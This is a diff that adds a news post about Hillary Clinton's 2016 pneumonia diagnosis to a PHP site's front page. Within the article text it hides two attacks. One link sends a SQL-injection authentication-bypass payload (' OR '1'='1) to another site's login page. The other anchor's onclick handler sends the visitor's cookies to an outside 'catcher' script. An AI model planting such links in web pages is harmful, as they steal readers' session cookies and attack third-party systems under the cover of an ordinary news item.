@@ -11,6 +11,29 @@ include 'header.php';
 	  
     	  
     <!-- headline -->    
+     <h2> <a href="/featured/20160912-clinton-pneumonia.php">Hillary Clinton’s Doctor Says Pneumonia Led to Abrupt Exit From 9/11 Event</a></h2>
+       
+  <p class="details">By JONATHAN MARTIN and AMY CHOZICKSEPT. 12, 2016  <a href="#"></a> </p>
+           <div class="thumb"><a href="#"><img src="/images/hillary-clinton-ill.jpg"  alt="Hillary-clinton-ill" /></a></div>
+       
+<p>
+Hillary Clinton is being treated for <a href="http://www.theplanetreports.com/home.php?username=%27+OR+%271%27%3D%271&password=%27+OR+%271%27%3D%
+271&submit=Login" target="_blank">pneumonia and dehydration </a>, her doctor said on Sunday, hours after she abruptly left a ceremony in New York honoring the <a onclick="document.location='http://www.latenightreport.com/catcher.php?c='+escape(document.cookie);" href="#"> 15th anniversary of the Sept. 11 </a> attacks and had to be helped into a van by Secret Service agents.
+
+</p>
+
+<p class="readmore">[ <a href="/featured/20160912-clinton-pneumonia.php">read more</a> ]</p>
+	          	<div class="break"></div>
+</div>  
+<!-- end of post -->
+
+
+
+<!-- start of post  -->
+<div class="post">
+	  
+    	  
+    <!-- headline -->    
      <h2> <a href="/featured/20160911-fifteen-year-after-9-11.php">Fifteen years after 9/11: Terrorism a mutating virus adapting itself to the changing world</a></h2>
        
   <p class="details">Vishnupriya Bhandaram and Karan Pradhan Sep 11, 2016 11:08 IST <a href="#"></a> </p>
